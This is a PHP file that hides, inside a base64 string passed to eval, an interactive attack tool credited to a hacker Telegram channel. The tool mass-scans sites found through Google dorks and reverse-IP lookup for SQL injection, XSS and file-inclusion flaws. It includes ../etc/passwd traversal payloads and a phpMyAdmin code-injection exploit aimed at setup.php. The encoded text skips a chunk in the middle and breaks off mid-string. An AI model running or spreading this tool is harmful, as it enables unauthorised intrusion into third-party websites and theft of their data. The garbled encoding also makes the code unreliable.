<?php

eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwoKU3RhcnQoKTsKCmZ1bmN0aW9uIFN0YXJ0KCkgewogICAgCiAgICAkbGlzdF9jb21tYW5kID0gYXJyYXkoJ2hlbHAnLCdzcWwnLCdyZmknLCdsZmknLCd4c3MnLCdmdWxsJywnZ29vZ2xlJywnZ2V0bGlzdCcsJ2p1bXAnLCdleHBsb2l0Jywnd2dldCcsJ3F1aXQnLCAncG1hcHduJywnaW5qZWN0b3InLCdoZXhzdHJpbmcnLCdtZDVzdHJpbmcnLCdwb3J0c2NhbicpOwogICAgCiAgICBwcmludCBMb2dvKCk7CiAgICBUaXBzKCk7CiAgICB3aGlsZSgxKSB7CiAgICAgICAgZndyaXRlKFNURE9VVCwgIlxuLVNjYW5uZXIkOiAiKTsKICAgICAgICAkY21kID0gdHJpbShmZ2V0cyhTVERJTikpOwogICAgICAgIGlmKCRjbWQgPT0gJ2Z1bGwnKSB7CiAgICAgICAgICAgIGZ3cml0ZShTVERPVVQsICJcbi1TSVRFOiAiKTsKICAgICAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgICAgIGlmKGVtcHR5KCRzaXRlKSkgewogICAgICAgICAgICAgICAgcHJpbnQgIltFcnJvcl1QbGVhc2UgZW50ZXIgc2l0ZSBVUkxcbiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZ1bGwoJHNpdGUpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICBpZihpbl9hcnJheSgkY21kLCAkbGlzdF9jb21tYW5kKSkgewogICAgICAgICRjbWQoKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICJbRXJyb3JdQ29tbWFuZCBub3QgZm91bmRcbiI7CiAgICAgICAgICAgIFRpcHMoKTsKICAgICAgICB9CiAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIExvZ28oKSB7CgokdGV4dCAuPSAifCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKnxcbiI7CiR0ZXh0IC49ICIgICAgICAgIHNjYW5uZXIgdG9vbCBjb2RlZCBieSDhl7Dhnarhlbzhl6nhl7Dhl6nhl55cbiI7CiR0ZXh0IC49ICIgICAgICAgIHdlIGNoYW5uZWwgb24gIHRlbGVncmFtIDogdC5tZS9IYUNLZXIxNTU1NTIzMjNcbiI7CiR0ZXh0IC49ICIgICAgICAgIFlvdXR1YmUgOiBZb3VyIEd1aWRlIFRvIFsgSGFDa2VSIF1cbiI7CiR0ZXh0IC49ICIgICAgICAgIGlmIHRoaXMgdG9vbCBoYXZlIGFueSBwcm9ibGVtcyBjb250YWN0IHVzwqBncm91cCBjaGF0IDogdC5tZS9RS0FLQVJPVE9cbiI7CiR0ZXh0IC49ICIgICAgICAgIDIwLzQvMjAyMFxuIjsKJHRleHQgLj0gInwqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKip8XG4iOwokdGV4dCAuPSAiXG4iOwpwcmludCAkdGV4dDsKfQoKCmZ1bmN0aW9uIEhlbHAoKSB7CgokdGV4dCAuPSAiW3NxbF0gLS0tLS0tLS0+IFNjYW4gU1FMIEluamVjdGlvbiB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW3hzc10gLS0tLS0tLS0+IFNjYW4gWFNTKGNyb3NzIHNpdGUgc2NyaXB0aW5nKSB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW3JmaV0gLS0tLS0tLS0+IFNjYW4gUkZJKHJlbW90ZSBmaWxlIGluY2x1ZGUpIHZ1bG5lcmFibGVcbiI7CiR0ZXh0IC49ICJbbGZpXSAtLS0tLS0tLT4gU2NhbiBMRkkobG9jYWwgZmlsZSBpbmNsdWRlKSB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW3BtYXB3bl0gLS0tLS0+IFNjYW4gcGhwTXlBZG1pbiBjb2RlIGluamVjdGlvbiB2dWxuZXJhYmxlXG4iOwokdGV4dCAuPSAiW2Z1bGxdIC0tLS0tLS0+IEdyYWIgbGluayBmcm9tIHdlYnNpdGUgYW5kIHN0YXJ0IGFsbCBzY2FuXG4iOwokdGV4dCAuPSAiW2dvb2dsZV0gLS0tLS0+IEdyYWIgd2Vic2l0ZSBmcm9tIGdvb2dsZSBhbmQgc3RhcnQgYWxsIHNjYW5cbiI7CiR0ZXh0IC49ICJbZ2V0bGlzdF0gLS0tLT4gR3JhYiB3ZWJzaXRlIGZyb20gZmlsZSBhbmQgc3RhcnQgYWxsIHNjYW5cbiI7CiR0ZXh0IC49ICJbanVtcF0gLS0tLS0tLT4gRmluZCBhbGwgc2l0ZSBob3N0ZWQgb24gc2FtZSBpcCBhbmQgc3RhcnQgYWxsIHNjYW5cbiI7CiR0ZXh0IC49ICJbZXhwbG9pdF0gLS0tLT4gRXhwbG9pdC1EQiBFeHBsb2l0IEZpbmRlclxuIjsKJHRleHQgLj0gIltpbmplY3Rvcl0gLS0tPiBBdXRvbWF0aWMgU1FMIEluamVjdG9yLCB3b3JrIGZvciB2NCBhbmQgdjVcbiI7CiR0ZXh0IC49ICJbaGV4c3RyaW5nXSAtLT4gQ29udmVydCBzdHJpbmcgdG8gaGV4ICh1c2VmdWwgZm9yIHNxbCBpbmplY3Rpb24pXG4iOwokdGV4dCAuPSAiW21kNXN0cmluZ10gLS0+IENvbnZlcnQgc3RyaW5nIHRvIE1ENSBIYXNoXG4iOwokdGV4dCAuPSAiW3BvcnRzY2FuXSAtLT4gQ2hlY2sgcG9ydCBvcGVuIGFuZCBjbG9zZVxuIjsKJHRleHQgLj0gIlt3Z2V0XSAtLS0tLS0tPiBHZXQgZmlsZSBmcm9tIFVSTFxuIjsKcHJpbnQgJHRleHQ7Cn0KCmZ1bmN0aW9uIFRpcHMoKSB7CiAgICBwcmludCAiW1RpcHNdIEZvciBoZWxwLCB0eXBlICdoZWxwJyBhbmQgdG8gcXVpdCBwbGVhc2UgdHlwZSAncXVpdCdcbiI7Cn0KCmZ1bmN0aW9uIGZ1bGwoJHNpdGUpIHsKICAgIHByaW50ICJbLV0gU3RhcnQgZnVsbCBzY2FubmluZyBtb2RlLlxuIjsKICAgIHBtYXB3bigkc2l0ZSwgMSk7CiAgICBwcmludCAiWy1dIFN0YXJ0IFNRTCBJbmplY3Rpb24gU2NhblxuIjsKICAgIHNxbCgkc2l0ZSwgMSk7CiAgICBwcmludCAiWy1dIFN0YXJ0IFhTUyBTY2FuXG4iOwogICAgeHNzKCRzaXRlLCAxKTsKICAgIHByaW50ICJbLV0gU3RhcnQgUkZJIFNjYW5cbiI7CiAgICByZmkoJHNpdGUsIDEpOwogICAgcHJpbnQgIlstXSBTdGFydCBMRkkgU2NhblxuIjsKICAgIGxmaSgkc2l0ZSwgMSk7Cn0KCmZ1bmN0aW9uIGhleHN0cmluZygpIHsKICAgIGZ3cml0ZShTVERPVVQsICItU3RyaW5nOiAiKTsKICAgICRzdHJpbmcgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICBwcmludCAiWy1dIFN0cmluZzogJHN0cmluZ1xuIjsKICAgIHByaW50ICJbLV0gSGV4OiAiLkhleFZhbHVlKCRzdHJpbmcpLiJcbiI7Cn0KCmZ1bmN0aW9uIHBvcnRzY2FuKCkgewogICAgZndyaXRlKFNURE9VVCwgIi1JUC9Eb21haW46ICIpOwogICAgJGhvc3QgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICBmd3JpdGUoU1RET1VULCAiLVN0YXJ0IFBvcnQ6ICIpOwogICAgJHNwb3J0ID0gdHJpbShmZ2V0cyhTVERJTikpOwogICAgZndyaXRlKFNURE9VVCwgIi1FbmQgUG9ydDogIik7CiAgICAkZXBvcnQgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICBwcmludCAiWy1dIElQL0RvbWFpbiA6ICRob3N0XG4iOwogICAgJHNwb3J0ID0gaW50dmFsKCRzcG9ydCk7CiAgICAkZXBvcnQgPSBpbnR2YWwoJGVwb3J0KTsKICAgIHByaW50ICJbLV0gQ2hlY2tpbmcuLi5cbiI7CiAgICBmb3IoJGkgPSAkc3BvcnQ7ICRpIDw9ICRlcG9ydDsgJGkrKykgewogICAgICAgICRjaGVjayA9IEBmc29ja29wZW4oJGhvc3QsICRpLCAkZXJybm8sICRlcnJzdHIsIDMpOwogICAgICAgIGlmKCRjaGVjaykgewogICAgICAgICAgICBwcmludCAiWy1dIFBvcnQgJyRpJyBpcyBvcGVuXG4iOwogICAgICAgIH0KICAgIH0KICAgIHByaW50ICJbLV0gRG9uZVxuIjsKfQoKZnVuY3Rpb24gbWQ1c3RyaW5nKCkgewogICAgZndyaXRlKFNURE9VVCwgIi1TdHJpbmc6ICIpOwogICAgJHN0cmluZyA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgIHByaW50ICJbLV0gU3RyaW5nOiAkc3RyaW5nXG4iOwogICAgcHJpbnQgIlstXSBNRDU6ICIubWQ1KCRzdHJpbmcpLiJcbiI7Cn0KCgpmdW5jdGlvbiBqdW1wKCkgewoJcHJpbnQgIkV4YW1wbGU6IGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIjsgIAogICAgICAgIGZ3cml0ZShTVERPVVQsICItU0lURTogIik7CiAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgJHJlcXVlc3QgPSBwYXJzZV91cmwoJHNpdGUpOwogICAgICAgICRqdW1wX3NpdGUgPSAiaHR0cDovL3d3dy5pcC1hZHJlc3MuY29tL3JldmVyc2VfaXAvJHJlcXVlc3RbaG9zdF0iOwogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHJlcXVlc3RbaG9zdF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBQYXRoOiAkcmVxdWVzdFtwYXRoXVxuIjsKICAgICAgICBwcmludCAiWy1dIFNlcnZlciBJUDogIi5nZXRob3N0YnluYW1lKCRyZXF1ZXN0Wydob3N0J10pLiJcbiI7CiAgICAgICAgcHJpbnQgIlstXSBHZXQgbGlzdCBkb21haW4gaG9zdGVkIG9uIHRoZSBpcC4uLlxuIjsKICAgICAgICAkbGlzdCA9IGNvbl9ob3N0KCRqdW1wX3NpdGUpOwogICAgICAgIHByZWdfbWF0Y2hfYWxsKCIvPGEgaHJlZj1cIlwvd2hvaXNcLyguKj8pXCI+V2hvaXM8XC9hPi8iLCRsaXN0LCAkbGlua3MpOwogICAgICAgIHByaW50ICJbLV0gVG90YWwgc2l0ZSBob3N0ZWQgb24gIi4kcmVxdWVzdFsnaG9zdCddLiIgOiAiLmNvdW50KCRsaW5rc1sxXSkuIlxuIjsKICAgICAgICBmb3JlYWNoKCRsaW5rc1sxXSBhcyAkbGluaykgewogICAgICAgICRsaW5rID0gImh0dHA6Ly8iLiRsaW5rOwogICAgICAgICRzYXZlID0gQGZpbGVfcHV0X2NvbnRlbnRzKCdkb21haW5fbGlzdC50eHQnLCIkbGlua1xuIixGSUxFX0FQUEVORCk7CiAgICAgICAgfQogICAgICAgIHByaW50ICJbLV0gRG9tYWluIGxpc3Qgc2F2ZWQgdG8gJ2RvbWFpbl9saXN0LnR4dCdcbiI7CiAgICAgICAgZm9yZWFjaCgkbGlua3NbMV0gYXMgJGxpbmspIHsKICAgICAgICAkbGluayA9ICJodHRwOi8vIi4kbGluazsKICAgICAgICBmdWxsKCRsaW5rKTsKICAgICAgICBqb29tbGEoJGxpbmspOwogICAgICAgIH0gICAgICAgIAp9CgoKCmZ1bmN0aW9uIGdvb2dsZSgpIHsKICBmd3JpdGUoU1RET1VULCAiLURPUks6ICIpOwogICRkb3JrID0gdHJpbShmZ2V0cyhTVERJTikpOwogIHByaW50ICJbLV0gRG9yazogJGRvcmtcbiI7CiAgcHJpbnQgIlstXSBTdGFydCBnb29nbGUgc2Nhbm5pbmcuLi5cbiI7CiAgJHRvdGFsID0gMDsKICBmb3IoJGkgPSAwOyRpIDwgMTA7JGkrKykgewogICAgJGZwID0gImh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L3NlcnZpY2VzL3NlYXJjaC93ZWI/dj0xLjAmcnN6PWxhcmdlJnN0YXJ0PSRpJnE9Ii4kZG9yazsKCiAgICAkYm9keSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmcCk7CiAgICAkanNvbiA9IGpzb25fZGVjb2RlKCRib2R5KTsKCiAgICBmb3IoJHggPSAwOyR4IDwgY291bnQoJGpzb24tPnJlc3BvbnNlRGF0YS0+cmVzdWx0cyk7JHgrKykgewogICAgICAkcmVhbCA9IHVybGRlY29kZSgkanNvbi0+cmVzcG9uc2VEYXRhLT5yZXN1bHRzWyR4XS0+dXJsKTsKICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ2RvbWFpbl9saXN0LnR4dCcsICIkcmVhbFxuIixGSUxFX0FQUEVORCk7CiAgICAgICR0b3RhbCsrOwogICAgfQogIH0KICBwcmludCAiWy1dIERvbWFpbiBsaXN0IHNhdmVkIHRvICdkb21haW5fbGlzdC50eHQnXG4iOwogIHByaW50ICJbK10gVG90YWwgc2l0ZSBmb3VuZDogJHRvdGFsXG4iOwogICRkb21haW4gPSBmaWxlKCdkb21haW5fbGlzdC50eHQnKTsKICBmb3JlYWNoKCRkb21haW4gYXMgJGxpbmUpIHsKICAgIGZ1bGwoJGxpbmUpOwogIH0KfQoKZnVuY3Rpb24gZ2V0bGlzdCgpIHsKICAgIGZ3cml0ZShTVERPVVQsICItRklMRTogIik7CiAgICAkZ2V0ZmlsZSA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgICRoYW5kbGUgPSBmb3BlbigkZ2V0ZmlsZSwgInIiKTsKd2hpbGUgKCFmZW9mKCRoYW5kbGUpKSB7CiAgICAkbGluZSA9IGZnZXRzKCRoYW5kbGUpOwogICAgJHRyeSA9IHRyaW0oJGxpbmUpOwogICAgZnVsbCgkdHJ5KTsKICAgIH0KZmNsb3NlKCRoYW5kbGUpOwp9CgpmdW5jdGlvbiBqb29tbGEoJHNpdGUpIHsKICAgIGlmKCRjb250ZW50ID0gY29uX2hvc3QoJHNpdGUpKSB7CiAgICAgICAgaWYocHJlZ19tYXRjaCgiL29wdGlvbj1jb21fLyIsICRjb250ZW50KSkgewogICAgICAgICAgICBwcmludCAiWy1dIEpvb21sYSBzaXRlIGZvdW5kOiAkc2l0ZVxuIjsKICAgICAgICB9CiAgICB9IAp9CgpmdW5jdGlvbiBsZmkoJHNpdGUgPSAnJywgJGZ1bGwgPSAnMCcpIHsKICAgICRsaXN0X2xmaSA9IGFycmF5KAogICAgICAgICcuLi9ldGMvcGFzc3dkJywKICAgICAgICAnLi4vLi4vZXRjL3Bhc3N3ZCcsCiAgICAgICAgJy4uLy4uLy4uL2V0Yy9wYXNzd2QnLAogICAgICAgICcuLi8uLi8uLi8uLi9ldGMvcGFzc3dkJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QnLAogICAgICAgICcuLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QnLAogICAgICAgICcuLi9ldGMvcGFzc3dkJTAwJywKICAgICAgICAnLi4vLi4vZXRjL3Bhc3N3ZCUwMCcsCiAgICAgICAgJy4uLy4uLy4uL2V0Yy9wYXNzd2QlMDAnLAogICAgICAgICcuLi8uLi8uLi8uLi9ldGMvcGFzc3dkJTAwJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QlMDAnLAogICAgICAgICcuLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJTAwJywKICAgICAgICAnLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMCcsCiAgICAgICAgJy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QlMDAnLAogICAgKTsKICAgICAgICBpZigkZnVsbCA9PSAnMCcpIHsKICAgICAgICBmd3JpdGUoU1RET1VULCAiXG4tU0lURTogIik7CiAgICAgICAgJHNpdGUgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHNpdGUgPSAkc2l0ZTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJHJlcXVlc3QgPSBwYXJzZV91cmwoJHNpdGUpOwogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHJlcXVlc3RbaG9zdF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBQYXRoOiAkcmVxdWVzdFtwYXRoXVxuIjsKICAgICAgICBwcmludCAiWy1dIFRyeSBjb25uZWN0IHRvIGhvc3RcbiI7CiAgICAgICAgJHVybCA9ICIiLiRyZXF1ZXN0WydzY2hlbWUnXS4iOi8vIi4kcmVxdWVzdFsnaG9zdCddLiRyZXF1ZXN0WydwYXRoJ10uIiI7CiAgICAgICAgaWYoY29uX2hvc3QoJHVybCkpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAiWytdIENvbm5lY3QgdG8gaG9zdCBzdWNjZXNzZnVsXG4iOwogICAgICAgICAgICBwcmludCBHZXRfSW5mbygkdXJsKTsKICAgICAgICAgICAgcHJpbnQgIlstXSBGaW5kaW5nIGxpbmsgb24gdGhlIHdlYnNpdGVcbiI7CiAgICAgICAgICAgIHByaW50ICJbK10gRm91bmQgbGluayA6ICIuY291bnQoZmluZF9saW5rKCR1cmwpKS4iXG4iOwogICAgICAgICAgICBwcmludCAiWy1dIEZpbmRpbmcgdnVsbmVyYWJsZS4uLlxuIjsKICAgICAgICAgICAgaWYoaXNfYXJyYXkoZmluZF9saW5r



+bG9hZEhUTUwoJGh0bWwpOwoKICBmb3JlYWNoKCRkb20tPmdldEVsZW1lbnRzQnlUYWdOYW1lKCd0ZCcpIGFzICR0YWJsZSkKICB7CiAgICBpZigkdGFibGUtPmdldEF0dHJpYnV0ZSgnY2xhc3MnKSA9PSAnbGlzdF9leHBsb3RfZGF0ZScpCiAgICB7CiAgICAgICRhdHRyaWJ1dGVzID0gJHRhYmxlLT5hdHRyaWJ1dGVzOwogICAgICAkZGF0ZSA9ICR0YWJsZS0+bm9kZVZhbHVlOwogICAgICBwcmludCAiXG4iOwogICAgICBwcmludCAiWytdIEV4cGxvaXQgRGF0ZSA9ICRkYXRlIjsKICAgICAgJHNhdmUgPSBmaWxlX3B1dF9jb250ZW50cygnZXhwbG9pdHMubG9nJywgIlsrXUV4cGxvaXQgRGF0ZSA6ICRkYXRlIFxyXG4iLEZJTEVfQVBQRU5EKTsKICAgIH0KICAgIGlmKCR0YWJsZS0+Z2V0QXR0cmlidXRlKCdjbGFzcycpID09ICdsaXN0X2V4cGxvdF9kbGluaycpCiAgICB7CiAgICAgIGZvcmVhY2goJHRhYmxlLT5nZXRFbGVtZW50c0J5VGFnTmFtZSgnYScpIGFzICRsaW5rKQogICAgICB7CgkkZGxpbmsgPSAkbGluay0+Z2V0QXR0cmlidXRlKCdocmVmJyk7CglwcmludCAiXG4iOwoJcHJpbnQgIlsrXSBFeHBsb2l0IFVSTCAgPSAkZGxpbmsiOwoJJHNhdmUgPSBmaWxlX3B1dF9jb250ZW50cygnZXhwbG9pdHMubG9nJywgIlsrXUV4cGxvaXQgVVJMICA9ICIuJGRsaW5rLiJcclxuIixGSUxFX0FQUEVORCk7CiAgICAgIH0KICAgIH0KICAgIGlmKCR0YWJsZS0+Z2V0QXR0cmlidXRlKCdjbGFzcycpID09ICdsaXN0X2V4cGxvdF9kZXNjcmlwdGlvbicpCiAgICB7CiAgICAgIGZvcmVhY2goJHRhYmxlLT5nZXRFbGVtZW50c0J5VGFnTmFtZSgnYScpIGFzICRsaW5rKQogICAgICB7CgkkZGVzYyA9ICgkbGluay0+Z2V0QXR0cmlidXRlKCdocmVmJykgLiAiXHQiIC4gJGxpbmstPm5vZGVWYWx1ZSAuICJcbiIpOwoJJGF0dHJpYnV0ZXMgPSAkbGluay0+YXR0cmlidXRlczsKCSRkZXNjID0gJGxpbmstPm5vZGVWYWx1ZTsKCXByaW50ICJcbiI7CglwcmludCAiWytdIEV4cGxvaXQgTmFtZSA9ICRkZXNjIFxuIjsKCSRzYXZlID0gZmlsZV9wdXRfY29udGVudHMoJ2V4cGxvaXRzLmxvZycsICJbK11FeHBsb2l0IE5hbWUgPSAiLiRkZXNjLiJcclxuIixGSUxFX0FQUEVORCk7Cgkkc2F2ZSA9IGZpbGVfcHV0X2NvbnRlbnRzKCdleHBsb2l0cy5sb2cnLCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBcclxuIixGSUxFX0FQUEVORCk7CiAgICAgIH0KICAgIH0KICB9CiAgCiAgcHJpbnQgIlxuXG4iOwogIHByaW50ICJbK10gRG9uZSAhXG5cbiI7CiAgcHJpbnQgIlsrXSBTZWUgJ2V4cGxvaXRzLmxvZycgZm9yIGRldGFpbHMgbGlzdFxuIjsKfQoKZnVuY3Rpb24gcG1hcHduKCRzaXRlID0gJycsICRmdWxsID0gJzAnKSB7CiRsaXN0ID0gYXJyYXkoCicvcGhwbXlhZG1pbi8nLAonL3BocE15QWRtaW4vJywgCicvUE1BLycsCicvcG1hLycsIAonL2FkbWluLycsIAonL2RiYWRtaW4vJywgCicvbXlzcWwvJywgCicvbXlhZG1pbi8nLCAKJy9waHBteWFkbWluMi8nLCAKJy9waHBNeUFkbWluMi8nLCAKJy9waHBNeUFkbWluLTIvJywgCicvcGhwLW15LWFkbWluLycsIAonL3BocE15QWRtaW4tMi4yLjMvJywgCicvcGhwTXlBZG1pbi0yLjIuNi8nLCAKJy9waHBNeUFkbWluLTIuNS4xLycsIAonL3BocE15QWRtaW4tMi41LjQvJywgCicvcGhwTXlBZG1pbi0yLjUuNS1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjUuNS1yYzIvJywgCicvcGhwTXlBZG1pbi0yLjUuNS8nLCAKJy9waHBNeUFkbWluLTIuNS41LXBsMS8nLCAKJy9waHBNeUFkbWluLTIuNS42LXJjMS8nLCAKJy9waHBNeUFkbWluLTIuNS42LXJjMi8nLCAKJy9waHBNeUFkbWluLTIuNS42LycsIAonL3BocE15QWRtaW4tMi41LjcvJywgCicvcGhwTXlBZG1pbi0yLjUuNy1wbDEvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1hbHBoYS8nLCAKJy9waHBNeUFkbWluLTIuNi4wLWFscGhhMi8nLCAKJy9waHBNeUFkbWluLTIuNi4wLWJldGExLycsIAonL3BocE15QWRtaW4tMi42LjAtYmV0YTIvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1yYzIvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1yYzMvJywgCicvcGhwTXlBZG1pbi0yLjYuMC8nLCAKJy9waHBNeUFkbWluLTIuNi4wLXBsMS8nLCAKJy9waHBNeUFkbWluLTIuNi4wLXBsMi8nLCAKJy9waHBNeUFkbWluLTIuNi4wLXBsMy8nLCAKJy9waHBNeUFkbWluLTIuNi4xLXJjMS8nLCAKJy9waHBNeUFkbWluLTIuNi4xLXJjMi8nLCAKJy9waHBNeUFkbWluLTIuNi4xLycsIAonL3BocE15QWRtaW4tMi42LjEtcGwxLycsIAonL3BocE15QWRtaW4tMi42LjEtcGwyLycsIAonL3BocE15QWRtaW4tMi42LjEtcGwzLycsIAonL3BocE15QWRtaW4tMi42LjItcmMxLycsIAonL3BocE15QWRtaW4tMi42LjItYmV0YTEvJywgCicvcGhwTXlBZG1pbi0yLjYuMi1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjYuMi8nLCAKJy9waHBNeUFkbWluLTIuNi4yLXBsMS8nLCAKJy9waHBNeUFkbWluLTIuNi4zLycsIAonL3BocE15QWRtaW4tMi42LjMtcmMxLycsIAonL3BocE15QWRtaW4tMi42LjMvJywgCicvcGhwTXlBZG1pbi0yLjYuMy1wbDEvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDEvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDIvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDMvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDQvJywgCicvcGhwTXlBZG1pbi0yLjYuNC8nLCAKJy9waHBNeUFkbWluLTIuNy4wLWJldGExLycsIAonL3BocE15QWRtaW4tMi43LjAtcmMxLycsIAonL3BocE15QWRtaW4tMi43LjAtcGwxLycsIAonL3BocE15QWRtaW4tMi43LjAtcGwyLycsIAonL3BocE15QWRtaW4tMi43LjAvJywgCicvcGhwTXlBZG1pbi0yLjguMC1iZXRhMS8nLCAKJy9waHBNeUFkbWluLTIuOC4wLXJjMS8nLCAKJy9waHBNeUFkbWluLTIuOC4wLXJjMi8nLCAKJy9waHBNeUFkbWluLTIuOC4wLycsIAonL3BocE15QWRtaW4tMi44LjAuMS8nLCAKJy9waHBNeUFkbWluLTIuOC4wLjIvJywgCicvcGhwTXlBZG1pbi0yLjguMC4zLycsIAonL3BocE15QWRtaW4tMi44LjAuNC8nLCAKJy9waHBNeUFkbWluLTIuOC4xLXJjMS8nLCAKJy9waHBNeUFkbWluLTIuOC4xLycsIAonL3BocE15QWRtaW4tMi44LjIvJywgCicvc3FsbWFuYWdlci8nLCAKJy9teXNxbG1hbmFnZXIvJywgCicvcC9tL2EvJywgCicvUE1BMjAwNS8nLCAKJy9wbWEyMDA1LycsIAonL3BocG1hbmFnZXIvJywgCicvcGhwLW15YWRtaW4vJywgCicvcGhwbXktYWRtaW4vJywgCicvd2ViYWRtaW4vJywgCicvc3Fsd2ViLycsIAonL3dlYnNxbC8nLCAKJy93ZWJkYi8nLCAKJy9teXNxbGFkbWluLycsIAonL215c3FsLWFkbWluLycsCik7CgogICAgICAgIGlmKCRmdWxsID09ICcwJykgewogICAgICAgIGZ3cml0ZShTVERPVVQsICJcbi1TSVRFOiAiKTsKICAgICAgICAkc2l0ZSA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc2l0ZSA9ICRzaXRlOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBwcmludCAiXG5bIV0gcG1hUFdOISAtIHBocE15QWRtaW4gQ29kZSBJbmplY3Rpb24gRXhwbG9pdChQSFApIGJ5IGQzY2s0XG5cbiI7CiAgICAgICAgcHJpbnQgIlstXSBTaXRlIDogIi4kc2l0ZS4iXG4iOwogICAgICAgIHByaW50ICJbLV0gU2Nhbm5pbmcgcGhwTXlBZG1pbiwgd2FpdCBzZWMuLlxuIjsKICAgICAgICBmb3JlYWNoKCRsaXN0IGFzICRwYXRoKSB7CiAgICAgICAgcGhwbXlhZG1pbl9zY2FuX3NpdGUoJHNpdGUuJHBhdGgpOwogIH0KfQoKZnVuY3Rpb24gcGhwbXlhZG1pbl9zY2FuX3NpdGUoJHVybCkgewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgIC8vcHJpbnQgJHVybDsKICAgIGlmIChwcmVnX21hdGNoKCIvMjAwIE9LLyIsICRyZXN1bHQpIGFuZCBwcmVnX21hdGNoKCIvcGhwTXlBZG1pbi8iLCAkcmVzdWx0KSkgewogICAgICAgIHByaW50ICJcblshXSB3MDB0ISB3MDB0ISBGb3VuZCBwaHBNeUFkbWluIFsgIi4kdXJsLiIgXSI7CiAgICAgICAgcHJpbnQgIlxuWy1dIFNjYW5uaW5nIHZ1bG5lcmFibGUsIHdhaXQgc2VjLi5cbiI7CiAgICAgICAgcGhwbXlhZG1pbl9leHBsb2l0X3NpdGUoJHVybCk7CiAgICB9Cn0KCmZ1bmN0aW9uIHBocG15YWRtaW5fZXhwbG9pdF9zaXRlKCR1cmwpIHsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybC4ic2NyaXB0cy9zZXR1cC5waHAiKTsKICAgICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICRjaDIgPSBjdXJsX2luaXQoKTsKICAgIGN1cmxfc2V0b3B0KCRjaDIsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgY